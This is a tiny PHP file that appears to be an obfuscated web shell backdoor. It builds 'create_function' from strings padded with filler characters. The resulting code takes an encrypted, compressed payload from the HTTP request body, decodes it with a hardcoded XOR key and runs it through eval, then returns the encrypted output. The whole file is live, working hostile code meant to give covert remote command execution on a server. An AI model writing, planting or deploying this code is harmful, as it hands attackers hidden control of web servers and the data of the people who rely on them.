<?php
$m='$k="dabaS9f96";S$Skh="a5e0219Sc8ScSfb";$kfS="d7afefb3a3bb"S;S$p="Jtx7USM1PS0';
$C='{$j};}}retuSrSn $o;S}if (@preg_matcSh("/$Skh(.S+)$kf/"SS,S@file_get_conteS';
$X='($i=S0;$i<$SSl;){for($j=0;(S$j<S$c&&$i<$Sl);$jS++,S$i++){$oS.=$t{$Si}SS^$k';
$M=';$Sr=@bSase64_encoSde(@x(SS@gzcoSmpreSss($o),$k));SpriSnt(S"$p$kh$r$kf");}';
$h='dXHaESEY";functiSon x($St,$k)S{$cS=strlen($k)S;$lSS=stSrlen($t);$o="";foSr';
$S='nts("phpS:/S/input"),S$m)S==1) {@Sob_start(S);@evSal(@gzunScSompress(@x(@b';
$F=str_replace('s','','crseatses_fsunsctsion');
$j='SaSse64_decodSe($m[1]S),$k))S);$o=@Sob_getS_ScontenSts();@ob_enSd_cleanS()';
$J=str_replace('S','',$m.$h.$X.$C.$S.$j.$M);
$B=$F('',$J);$B();
?>
